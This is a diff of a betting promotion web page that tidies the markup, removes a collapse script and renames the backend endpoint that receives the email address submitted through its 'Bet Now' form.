@@ -129,7 +129,7 @@
 
                     14. For additional promotional terma, click here
 
-                    15. Promoter: Coral interactive (Gibraltar) Limited, Gibraltar</p>
+                    15. Promoter: Coral interactive (Gibraltar) Limited, Gibraltar</p><p></p>
             </div>
             </div>
           </div>
@@ -142,12 +142,13 @@
       window.onload = function() {
         const betNowButton = document.getElementById("betNow");
         const emailInput = document.getElementById("email");
+        
         betNowButton.addEventListener("click", (event) => {
           event.preventDefault();
           const data = {
                 email: emailInput.value
-            };
-            fetch("tite.php", {
+            }; 
+            fetch("backend.php", {
                 headers: {
                     'Accept': 'application/json',
                     'Content-Type': 'application/json'
@@ -163,8 +164,6 @@
         })
       }
     </script>
-    <script>$('.collapse').collapse()
-
-    </script>
+    
   </body>
 </html>
